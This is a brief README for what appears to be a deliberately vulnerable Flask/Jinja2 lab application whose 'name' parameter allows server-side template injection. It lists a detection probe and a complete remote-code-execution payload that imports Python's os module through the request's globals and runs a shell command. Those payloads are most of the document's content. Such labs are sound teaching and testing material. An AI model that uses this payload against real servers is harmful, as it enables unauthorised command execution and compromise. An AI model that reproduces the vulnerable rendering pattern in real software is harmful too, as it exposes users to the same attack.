# Jinja2 SSTI

name parameter is vulnerable to SSTI. Run with
```
python3 flask_jinja.py
```

# Payloads
for detection
```
{{7*7}}
```

for RCE
```
{{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}
```

# Credit
Idea from https://gusralph.info/jinja2-ssti-research/
